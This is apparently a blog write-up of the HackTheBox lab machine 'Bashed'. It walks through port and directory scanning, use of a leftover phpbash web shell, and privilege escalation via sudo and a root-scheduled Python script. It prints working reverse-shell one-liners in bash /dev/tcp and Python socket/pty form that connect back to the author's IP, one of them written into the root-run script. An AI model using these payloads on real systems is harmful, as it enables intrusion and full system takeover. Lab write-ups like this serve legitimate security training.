---
layout: post                                                                                               
title: "HackTheBox - Bashed"                                                                               
date: 2022-05-08 19:11:00 +0100                                                                            
tags: RCE                                                                                                  
---
                                                                                                     
**Difficulty: <span style="color:green">Easy</span>**                                                      
**Personal Difficulty: <span style="color:green">Easy</span>**                                             
**Rating: 4.4 / 5**  

Bashed was a relatively easy box on HackTheBox. The first step to rooting the box was exploiting mistakes made by
what seemed to be a developer-turned-pentester, who left his penetration testing tool on his own site which we used
to run commands.  

## Enumeration

I started off with an nmap scan:  

```bash
nmap -sC -sV -oN scan.nmap 10.10.10.68
```
	Nmap scan report for 10.10.10.68
	Host is up (0.030s latency).
	Not shown: 999 closed tcp ports (conn-refused)
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Arrexel's Development Site


Only port 80 was running, a web server titled 'Arrexel's Development Site'. Habitually, I ran a gobuster directory search and
found some interesting pages.

	$ gobuster dir -u http://10.10.10.68/ -o scan.go -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt                                                                       
	===============================================================                                                                                                                              
	Gobuster v3.1.0                                                                                                                                                                              
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                                                
	===============================================================                                                                                                                              
	[+] Url:                     http://10.10.10.68/                                                                                                                                             
	[+] Method:                  GET                                                                                                                                                             
	[+] Threads:                 10                                                                                                                                                              
	[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt                                                                                                
	[+] Negative Status codes:   404                                                                                                                                                             
	[+] User Agent:              gobuster/3.1.0                                                                                                                                                  
	[+] Timeout:                 10s                                                                                                                                                             
	===============================================================                                                                                                                              
	2022/05/08 20:15:30 Starting gobuster in directory enumeration mode                                                                                                                          
	===============================================================                                                                                                                              
	/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]                                                                                                             
	/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]                                                                                                                
	/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]                                                                                                            
	/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]                                                                                                                
	/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]                                                                                                                
	/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]                                                                                                                 

I'll leave those alone for now. First, I decided to enter the main site to look around

### About phpbash

![Homepage](/assets/bashed-htb/homepage.png)

The front page advertises the tool that the site owner built. It's a pentesting tool called phpbash, but we don't know the details of it.
Following the entry link, we find a [Github](https://github.com/Arrexel/phpbash) for the tool! This means we have access to its source code and possibly commits which reveal
sensitive information.  

![Info Page](/assets/bashed-htb/info.png)

![Github Page](/assets/bashed-htb/github.png)

This tool looks like it creates a CLI for `shell_exec` function in php. Notice how the dev said "I actually developed it on this exact server!"  
This is, in fact a clue. This suggests that the tool *still* exists on this server, which would be very bad for the dev but great for us. Now it's
time to search through those directories that we found on gobuster.

### Finding phpbash

`/images`, `/php`, `/uploads`, `/css` and `/js` were all useless directories found during the search. However, the `/dev` had some use to us:                                                

![/dev](/assets/bashed-htb/dev.png)

The developer's own pwn tool was left there for us to use. This is a fatal mistake. ***NOTE : CLEAN UP AFTER YOURSELF DURING DEVELOPMENT.*** This
type of thing is very common; leaving credentials, keys, or old scripts on a internet-facing applications / sites leaves your system more vulnerable.
That being said, this is great for us as a 'malicious' user. I can use the tool to actually execute shell code like the dev said. 
### User flag

We have shell as www-data, a low privileged user created by web servers on Ubuntu (e.g. apache).
      
![console](/assets/bashed-htb/console.png)

We have easily acquired the user flag.
From here, we can try to gain access to a more privileged user's account and/or root.

## Privilege Escalation

As we are now logged on to the system, I can find out which commands I can run. I ran `sudo -l` and got the response:

```
www-data@bashed
:/home/arrexel# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
There was a user in the /home directory named scriptmanager. This message means we can run commands as this user. We should be able to spawn a
shell as this user, but we aren't on a terminal as we are running these commands from the web and via php. So I'll first do a reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.13/4444 0>&1" # where 10.10.14.13 is my ip and 4444 is the port it'll connect to me through
```
This method did not work. I thought of doing a python reverse shell, so I checked if python was installed with `which python3`:

	/usr/bin/python3

Good, we have python. Using the python reverse shell payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) on Github:

```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Starting a netcat listener on `4444`:

	$ nc -lnvp 4444                            
	listening on [any] 4444 ...

I entered the command in the web shell and got a local shell as www-data. I then used my previous idea and ran `/bin/bash` as user `scriptmanager` 
to change users.

```bash
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.68] 35620
$ pwd
pwd
/home/arrexel
$ sudo -u scriptmanager /bin/bash
sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/home/arrexel$ 
```
### Escalating from scriptmanager

We now need to find out what script manager can do.

```bash
scriptmanager@bashed:/home/arrexel$ cd /
cd /
scriptmanager@bashed:/$ ls -al
ls -al
total 88
drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
drwxr-xr-x   2 root          root           4096 Dec  4  2017 bin
drwxr-xr-x   3 root          root           4096 Dec  4  2017 boot
drwxr-xr-x  19 root          root           4240 May  8 12:12 dev
drwxr-xr-x  89 root          root           4096 Dec  4  2017 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Dec  4  2017 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 128 root          root              0 May  8 12:11 proc
drwx------   3 root          root           4096 Dec  4  2017 root
drwxr-xr-x  18 root          root            500 May  8 12:12 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 May  8 13:04 scripts
.
.
.

```
Seems like we own a directory called `scripts` in `/`.


```
scriptmanager@bashed:/$ cd scripts
cd scripts
scriptmanager@bashed:/scripts$ ls -al
ls -al
total 28
drwxrwxr--  2 scriptmanager scriptmanager  4096 May  8 14:56 .
drwxr-xr-x 23 root          root           4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager 12288 May  8 13:04 .test1.py.swp
-rw-r--r--  1 scriptmanager scriptmanager    60 May  8 13:14 test.py
-rw-r--r--  1 root          root             12 May  8 13:12 test.txt
```
Interesting. There are two files in here owned by root. Let's check `test.py`:

	scriptmanager@bashed:/scripts$ cat test.py
	cat test.py
	f = open("test.txt", "w")
	f.write("testing 123!")
	f.close

It seems like the owner made a file called test.txt and wrote some data into it. Notice that test.txt is owned by root. This suggests
that test.py can run commands with root privileges. I am going to overwrite it to get access to the system as root.

## <span style="color:red">Shell as root</span>

```bash
scriptmanager@bashed:/scripts$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",4443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > test.py                   
scriptmanager@bashed:/scripts$ 
```

I used the same reverse shell payload that we used earlier to gain access to this system, but this time via a different port (`4443`). Then, all I had to do was
start up a netcat listener and get shell as root:

```
$ nc -lnvp 4443             
listening on [any] 4443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.68] 39546
# whoami
whoami
root
# cd /root && ls
cd /root && ls
root.txt
```
### How? 

You may wonder how the script was executed as root.  
Well, I didn't execute it. The system must have had scheduled execution for test.py. How did
I know? This is because I tried to create a file in `/tmp` through the script. I ran it with python but got a Permission Denied error. This
led me to conclude that it was being run periodically.  

You could also check if this was the case by running `ps aux | grep test` and you'd find that
`python test.py` was being run as root.
